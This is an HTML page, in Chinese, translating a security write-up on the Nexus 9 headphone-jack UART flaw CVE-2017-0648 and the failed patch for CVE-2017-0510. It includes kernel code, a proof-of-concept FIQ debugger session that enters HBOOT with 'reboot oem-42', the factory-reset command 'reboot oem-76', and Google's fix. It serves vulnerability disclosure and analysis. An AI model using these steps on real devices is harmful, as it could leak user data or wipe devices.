@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Nexus 9漏洞允许黑客通过耳机接口攻击设备</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Nexus 9漏洞允许黑客通过耳机接口攻击设备</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzIyMzE5NTQ3Ng==&amp;mid=2650586987&amp;idx=1&amp;sn=ef80f3b9e8e5eb431593b3175dd1b2f2&amp;chksm=f029e750c75e6e46de5169f0b11d0e9d788512563c0d0ae417db2d0e725be21aafb3ef5dacff&amp;scene=126&amp;sessionid=1681370492#rd">http://mp.weixin.qq.com/s?__biz=MzIyMzE5NTQ3Ng==&amp;mid=2650586987&amp;idx=1&amp;sn=ef80f3b9e8e5eb431593b3175dd1b2f2&amp;chksm=f029e750c75e6e46de5169f0b11d0e9d788512563c0d0ae417db2d0e725be21aafb3ef5dacff&amp;scene=126&amp;sessionid=1681370492#rd</a></blockquote><p><span style="color: rgb(123, 12, 0);"/></p><p><img data-type="gif" data-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRyskxXGvZQgOFTCFaUiaU6PSmdmwSdb3JEAuZwPx0lPWsHf2xuib8Asew/0?wx_fmt=gif" data-ratio="0.15625" data-w="640" src="../Images/bd12d37e5b6d2b5b81389d88a9cef40a.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRyskxXGvZQgOFTCFaUiaU6PSmdmwSdb3JEAuZwPx0lPWsHf2xuib8Asew/0?wx_fmt=gif"/></p><p><span style="color: rgb(123, 12, 0);"/><br/></p><p><span style="color: rgb(123, 12, 0);">在2017年3月份，我们曾披露了有关漏洞CVE-2017-0510的信息，这是一个存在于Nexus 9设备中的严重漏洞，它将允许他人发动一种非常新颖的攻击，即通过恶意耳机来攻击Nexus 9设备。但有趣的是，这个漏洞的补丁并没有什么效果，所以这就导致了CVE-2017-0648的出现。为此，我们根据Google的漏洞披露政策负责任地将漏洞CVE-2017-0648的相关信息上报给了Google，而Google也在2017年6月份的Android安全公告中修复了这个漏洞。</span></p><p><span style="color: rgb(123, 12, 0);"><br/></span></p><p><span style="color: rgb(123, 12, 0);"><br/></span></p><p><span style="color: rgb(123, 12, 0);"/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWExWFfSqN4TFbxe2nR6oiao3Q1SmQmjOxW1NaeFF9TTyibZganOLsh4LUKOwpib33jSaOKTEKM8yQUSbw/0?wx_fmt=jpeg" style="width: 100%; height: auto;" data-ratio="0.5882352941176471" data-w="680" src="../Images/e0146ca989fcd9cedb65e374955f0a97.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWExWFfSqN4TFbxe2nR6oiao3Q1SmQmjOxW1NaeFF9TTyibZganOLsh4LUKOwpib33jSaOKTEKM8yQUSbw/0?wx_fmt=jpeg"/></p><p><span style="color: rgb(123, 12, 0);"/><br/></p><p><br/></p><p>在这篇文章中，我们首先要回顾一下漏洞CVE-2017-0510，然后分析一下之前的补丁为何无效（CVE-2017-0648），最后再给大家演示如何利用这个漏洞来发动攻击。文章结尾我们还会给大家提供漏洞CVE-2017-0648的修复方案，而这个补丁似乎终于成功地修复了这个漏洞。</p><p><br/></p><p><strong>回顾漏洞CVE-2017-0510</strong></p><p><br/></p><p>对于Google Nexus或Pixel设备来说，当TRRS连接器的MIC针脚上电压超过了一定的阈值时，手机的耳机插口将会变成一个UART调试接口【参考资料】。下图显示的是我们使用标准FTDI232RL电路板所组装的一个样本线缆：</p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWExWFfSqN4TFbxe2nR6oiao3QMOOTfdibADGBfYa9QnrWINcmgJZFI7PNRM8hPUrPnQV1qcDryJaEziaA/0?wx_fmt=jpeg" style="width: 100%; height: auto;" data-ratio="0.7601246105919003" data-w="321" src="../Images/ed8efcafe5d81900a4bcdc4b15d683ef.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWExWFfSqN4TFbxe2nR6oiao3QMOOTfdibADGBfYa9QnrWINcmgJZFI7PNRM8hPUrPnQV1qcDryJaEziaA/0?wx_fmt=jpeg"/></p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><p>Nexus 9中的这个漏洞意味着调试接口将允许外部访问FIQ调试器：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>&lt;hit enter to activate fiq debugger&gt;
+debug&gt; help
+FIQ Debugger commands:
+    pc            PC status
+    regs          Register dump    allregs       Extended Register dump    bt            Stack trace
+    reboot [&lt;c&gt;]  Reboot with command &lt;c&gt;
+    reset [&lt;c&gt;]   Hard reset with command &lt;c&gt;
+    irqs          Interupt status
+    kmsg          Kernel log    version       Kernel version
+    sleep         Allow sleep while in FIQ
+    nosleep       Disable sleep while in FIQ
+    console       Switch terminal to console
+    cpu           Current CPU
+    cpu &lt;number&gt;  Switch to CPU&lt;number&gt;
+    ps            Process list
+    sysrq         sysrq options
+sysrq &lt;param&gt; Execute sysrq with &lt;param&gt;</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>这将会产生非常有趣的后果，比如说：</p><p><br/></p><blockquote><p>1.任意进程抢占，这将导致用户数据存在泄漏的可能；</p><p>2.Stack Canaries泄漏；</p><p>3.ASLR解随机处理；</p><p>4.访问SysRq；</p><p>5.通过命令“reboot oem-42”重启进入HBOOT（HTC的Android Bootloader），将导致设备内部SoC芯片受到攻击（CVE-2017-0563 &amp; CVE-2017-0582）；</p><p>6.通过命令“reboot oem-76”恢复出厂设置。</p><p><br/></p></blockquote><h2><strong>CVE-2017-0510的尝试修复</strong></h2><p><strong><br/></strong></p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);">Google曾尝试通过减少FIQ Debugger的功能来修复漏洞CVE-2017-0510，在近期的版本中，当平台完全加载之后已经无法导出注册信息或是通过oem-N参数来重启设备了（防止设备重启进入HBOOT或恢复出厂设置）：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>debug&gt; help
+FIQ Debugger commands:
+ reboot        Reboot
+ reset         Hard reset irqs          Interrupt status
+ sleep         Allow sleep while in FIQ
+ nosleep       Disable sleep while in FIQ
+ console       Switch terminal to console
+ ps            Process list
+debug&gt;</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>Tegra内核树中相关的commit为a075f8ab69f6。在对补丁进行了分析之后，我们发现FIQ Debugger中很多关键的核心命令现在都由sysrq_on()函数进行管理。比如说，我们先测试一下fiq_debugger.c中的fiq_debugger_fiq_exec函数：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>static bool fiq_debugger_fiq_exec(struct fiq_debugger_state *state,const char *cmd, const struct pt_regs *regs,void *svc_sp){
+[...]
+} else if (!strcmp(cmd, "pc")) {if (sysrq_on())
+fiq_debugger_dump_pc(&amp;state-&gt;output, regs);
+} else if (!strcmp(cmd, "regs")) {if (sysrq_on())
+fiq_debugger_dump_regs(&amp;state-&gt;output, regs);
+} else if (!strcmp(cmd, "allregs")) {if (sysrq_on())
+fiq_debugger_dump_allregs(&amp;state-&gt;output, regs);
+} else if (!strcmp(cmd, "bt")) {if (sysrq_on())
+fiq_debugger_dump_stacktrace(&amp;state-&gt;output, regs,
+     100, svc_sp);
+[...]
+}</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>sysrq_on函数位于drivers/tty/sysrq.c文件中，其实现方法如下：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>bool sysrq_on(void) {
+ 	return sysrq_enabled || sysrq_always_enabled;
+ }</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>由于sysrq_always_enabled的值为0，我们姑且可以认定这个补丁的有效性仅仅取决于sysrq_enabled的值。</p><p><br/></p><h2><strong>针对FIQ Debugger和SysRq不受限制的临时访问（CVE-2017-0648）</strong></h2><p><strong><br/></strong></p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);">不幸的是，正如我们之前的文章所解释的那样，sysrq_enabled的默认值是1：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>static int __read_mostly sysrq_enabled = SYSRQ_DEFAULT_ENABLE;</code></pre></blockquote><p>这个参数定义在文件include/linux/sysrq.h之中：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>/* Enable/disable SYSRQ support by default (0==no, 1==yes). */#define SYSRQ_DEFAULT_ENABLE	<span class="hljs-meta" style="box-sizing: border-box; color: rgb(43, 110, 161);">1</span></code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>但是在平台的启动过程中，我们可以使用一个init脚本向/proc/sys/kernel/sysrq写入0值：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>[...]
+on early-init# Set init and its forked children's oom_adj.    write /proc/1/oom_score_adj -1000 
+    # Disable sysrq from keyboard    write /proc/sys/kernel/sysrq 0[...]</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><p>kernel/sysctl.c中的代码会将proc文件/proc/sys/kernel/sysrq回滚到原始状态，并最终触发sysrq_enabled的值发生变化。</p><p><br/></p><p>因此，尽管存在CVE-2017-0510的补丁，但在启动过程中我们仍然有一段非常短的时间（几毫秒）来执行init脚本，这样一来我们就仍然可以访问FIQ Debugger和SysRq命令了：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>Ephemeral Access to Unrestricted FIQ and SysRq (CVE-2017-0648)=============================================================
+ 
+      .------.   (1)    .------------------.
+ .--&gt; | BOOT | -------&gt; | Unrestricted FIQ | --.
+ |    `------'          `---------.--------'   | (4) .-------.
+ |                                |            |---&gt; | HBOOT |
+ |   (3)    .-------------.   (2) |            |     `-------' `--------- | Limited FIQ | &lt;-----'            |            
+            `-------------'                    | (5) .---------------.
+                                               `---&gt; | Factory Reset |
+                                                     `---------------'</code></pre></blockquote><p><strong>Transitions: </strong><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;">  </span></p><blockquote><p>(1) sysrq_enabled = SYSRQ_DEFAULT_ENABLE = 1</p><p>(2) init: write 0 /proc/sys/kernel/sysrq 0 =&gt; sysrq_enabled = 0</p><p>(3) attacker @ limited FIQ:      ’reboot’</p><p>(4) attacker @ unrestricted FIQ: ‘reboot oem-42′</p><p>(5) attacker @ unrestricted FIQ: ‘reboot oem-76′</p></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><h2><strong>PoC</strong></h2><p>在下面给出的例子中，我们演示了如何绕过CVE-2017-0510的补丁并抢占任意进程以及如何进入HBOOT模式。我们假设当平台完全加载完成之后攻击便立刻开始，我们首先触发了一次设备重启（正常重启），然后获得了FIQ Debugger的临时访问权。在这个过程中，我们运行了“bt”命令，然后通过命令“reboot oem-42”重启进入了HBOOT模式：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>debug&gt; help
+FIQ Debugger commands:
+ reboot        Reboot
+ reset         Hard reset irqs          Interrupt status
+ sleep         Allow sleep while in FIQ
+ nosleep       Disable sleep while in FIQ
+ console       Switch terminal to console
+ ps            Process list
+debug&gt; bt
+debug&gt; reboot
+debug&gt;
+[0000.045] Battery Present
+[0000.069] Battery Voltage: 3743 mV
+[0000.072] Battery charge sufficient
+[0000.076] Override BCT configs
+[0000.078] NvBootEmcReadMrr+++
+[...]
+[hboot query] query 24 is not implemented
+Platform Pre OS Boot configuration...
+[INFO] booting linux @ 0x80080000, tags @ 0x83a80000, ramdisk @ 0x82a80000, machine type: -1[...]
+&lt;hit enter to activate fiq debugger&gt;
+debug&gt; help
+FIQ Debugger commands:
+    pc            PC status
+    regs          Register dump    allregs       Extended Register dump    bt            Stack trace
+    reboot [&lt;c&gt;]  Reboot with command &lt;c&gt;
+    reset [&lt;c&gt;]   Hard reset with command &lt;c&gt;
+    irqs          Interupt status
+    kmsg          Kernel log    version       Kernel version
+    sleep         Allow sleep while in FIQ
+    nosleep       Disable sleep while in FIQ
+    console       Switch terminal to console
+    cpu           Current CPU
+    cpu &lt;number&gt;  Switch to CPU&lt;number&gt;
+    ps            Process list
+    sysrq         sysrq options
+    sysrq &lt;param&gt; Execute sysrq with &lt;param&gt;
+[...]
+debug&gt; bt
+pid: 89  comm: kworker/u4:1  x0 0000000000002ee0   x1 0000000000002d09
+  x2 000000000859c84a   x3 ffffffc002968c00  x4 0000000000defde8   x5 ffffffc000f56aa8
+  x6 ffffffc0029c8400   x7 ffffffc0029c8800  x8 ffffffc002935130   x9 0000000010624dd3
+ x10 000000000001a1b6  x11 0000000000000066 x12 000000000000006f  x13 0000000000000075 x14 000000000000006e  x15 0000000000000064 x16 000000000000000a  x17 0000000000000004[...]
+debug&gt; reboot oem-42[...]###[ Bootloader Mode ]###[...]
+hboot&gt; ?#. &lt;command&gt;               : &lt;brief description&gt;security_command:
+  1. boot                    : no desc.
+[...]
+ 14. readconfig              : no desc.
+ 15. readimei                : no des</code></pre></blockquote><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><h2><strong>CVE-2017-0648的修复方案</strong></h2><p><strong><br/></strong></p><p>Google在公告34597d088801中正式修复了这个漏洞。SYSRQ_DEFAULT_ENABLE的值已经被设置为0了，这样就可以阻止外部对FIQ Debugger和SysRq接口不受限制的临时访问：</p><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-word; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; white-space: normal; background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box; word-wrap: break-word; word-break: break-word; font-size: 12pt;"/></p><blockquote><pre style=" box-sizing: border-box; overflow: auto; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code>diff --git a/include/linux/sysrq.h b/include/linux/sysrq.h
+index 5a0bd93..d393eeb 100644--- a/include/linux/sysrq.h+++ b/include/linux/sysrq.h@@ -18,7 +18,7 @@ #include &lt;linux/types.h&gt;
+ 
+ /* Enable/disable SYSRQ support by default (0==no, 1==yes). */-#define SYSRQ_DEFAULT_ENABLE	1+#define SYSRQ_DEFAULT_ENABLE	0 
+ /* Possible values of bitmask for enabling sysrq functions */
+ /* 0x0001 is reserved for enable everything *</code></pre><p><br/></p></blockquote><p><img data-type="gif" data-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRL7zA6G4OWxgibRsJT9lLafJppjibev1TUxHYEia92BiaAtlc7u0BcOmUvA/0?wx_fmt=gif" data-ratio="0.7" data-w="500" src="../Images/e8c1330a4ae95198ebdb17e4f3bb4cbb.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRL7zA6G4OWxgibRsJT9lLafJppjibev1TUxHYEia92BiaAtlc7u0BcOmUvA/0?wx_fmt=gif"/></p><p><br/></p>
+        
+</body>
+</html>
